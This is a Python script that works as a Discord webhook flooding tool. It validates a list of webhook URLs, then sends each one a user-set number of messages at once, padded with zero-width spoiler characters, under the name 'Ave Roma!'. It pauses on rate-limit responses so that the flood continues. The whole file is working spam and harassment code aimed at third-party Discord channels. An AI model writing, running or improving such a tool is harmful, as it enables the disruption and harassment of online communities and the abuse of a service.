import os
import asyncio
import aiohttp
import asyncio
import time
import httpx

if os.name != "nt":
    import uvloop
    uvloop.install

valid = []
class launch_system:

    def __init__(self):
        # Checks if there are webhooks present in file.
        if os.path.getsize("System/webhooks.txt") == 0:
                print("\033[91m  > Enter webhooks into webhooks.txt...")
        # Only breaks if webhooks are entered.
        while True:
            if os.path.getsize("System/webhooks.txt") > 0:
                break
        time.sleep(2)

    async def bomb(self, session, target):
        for i in range(self.amount):
            code = await session.post(target, json={"content": ('||\u200b||' * 150) + self.payload, "username": "Ave Roma!", "avatar_url": "https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fi.pinimg.com%2Foriginals%2F91%2Fe8%2F04%2F91e804511211eda094fc2e21512f746c.png&f=1&nofb=1&ipt=5260067ec1e4a7d1743a73fdb4fdf2b3b38054dc82a6abd62ca780160631ccb6&ipo=images"})
            if code.status == 204 or code.status == 200:
                print("\033[92m  > Successful hit!")
            elif code.status == 429:
                retry = await code.json()
                await asyncio.sleep(retry["retry_after"])
            else:
                print("\033[91m  > Launch failed!")

    async def thermobaric(self):
        self.payload = input("\033[92m  > Enter payload ")
        try:
            self.amount = int(input("\033[92m  > Enter bombs/hook "))
            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False, keepalive_timeout=10000, ttl_dns_cache=10000, limit=0, limit_per_host=0), trust_env=False, skip_auto_headers=None, auto_decompress=True) as session:
                await asyncio.gather(*(asyncio.create_task(self.bomb(session, url)) for url in valid))
        except:
            print("\033[91m  > Invalid bombs/hook!")
            
    def bombard(self):
        # Checks webhook validity.
        with open("System/webhooks.txt", "r", encoding="utf-8") as f:
            for url in f.read().splitlines():
                if url[0:33] == "https://discord.com/api/webhooks/":
                    status = httpx.get(str(url)).status_code
                    if status == 200:
                        valid.append(str(url))
                    else:
                        pass
                    
        f = open("System/webhooks.txt", "a")
        f.truncate(0)
        if len(valid) == 0:
            print("\033[91m  > No Valid Webhooks")
            input("\033[91m\n  > Enter to proceed \033[33m ")
        else:
            for url in valid:
                f.write(str(url) + "\n")
            f.close()
            asyncio.run(self.thermobaric())

    def clean():
        with open("System/webhooks.txt", "a") as f:
            f.truncate(0)
            print("\033[92m  > Successful truncation")
            time.sleep(1.3)